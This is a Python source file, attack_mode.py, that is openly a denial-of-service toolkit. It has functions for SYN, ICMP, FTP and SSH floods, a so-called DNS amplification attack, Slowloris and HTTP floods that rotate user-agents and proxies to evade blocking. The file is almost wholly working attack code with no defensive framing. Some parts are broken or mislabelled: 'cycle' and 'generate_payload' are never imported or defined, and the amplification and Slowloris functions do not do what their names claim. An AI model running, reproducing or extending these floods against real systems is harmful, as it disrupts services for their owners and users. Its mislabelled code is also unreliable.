# attack_mode.py

import asyncio
import random
import socket
import os
import time
import logging
import scapy.all as scapy
from colorama import Fore, Style

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

def syn_flood(target_ip, target_port, duration):
    """Perform a SYN flood attack using scapy."""
    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a SYN packet using scapy
            ip_layer = scapy.IP(dst=target_ip)
            tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            packet = ip_layer / tcp_layer
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during SYN flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("SYN flood attack completed.")

def icmp_flood(target_ip, duration):
    """Perform an ICMP flood attack using scapy."""
    print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft an ICMP packet using scapy
            packet = scapy.IP(dst=target_ip) / scapy.ICMP()
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during ICMP flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("ICMP flood attack completed.")

async def dns_amplification(target_ip, duration):
    """Perform a DNS amplification attack."""
    print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Craft a DNS amplification packet
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during DNS amplification: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("DNS amplification attack completed.")

def ftp_flood(target_ip, target_port, duration):
    """Perform an FTP flood attack."""
    print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Create a socket and connect to the target FTP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Send a random payload
            sock.send(os.urandom(1024))
            sock.close()
        except Exception as e:
            print(f"Error during FTP flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("FTP flood attack completed.")

def ssh_flood(target_ip, target_port, duration):
    """Perform an SSH flood attack."""
    print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Create a socket and connect to the target SSH server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Send a random payload
            sock.send(os.urandom(1024))
            sock.close()
        except Exception as e:
            print(f"Error during SSH flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("SSH flood attack completed.")

async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
    """Perform a Slowloris attack by keeping many connections open."""
    import aiohttp
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        # Send a partial HTTP request
                        async with session.get(target_url, headers=headers, proxy=next(proxy_pool) if proxy_pool else None) as response:
                            # Keep the connection open by sending partial data
                            await asyncio.sleep(pause_time)
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform an HTTP/2 flood attack."""
    import aiohttp
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload
                        ) as response:
                            pass  # Just send the request, no need to wait for response
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform a rate-limited attack."""
    import aiohttp
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload, timeout=aiohttp.ClientTimeout(total=5)
                        ) as response:
                            pass  # Just send the request, no need to wait for response
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)
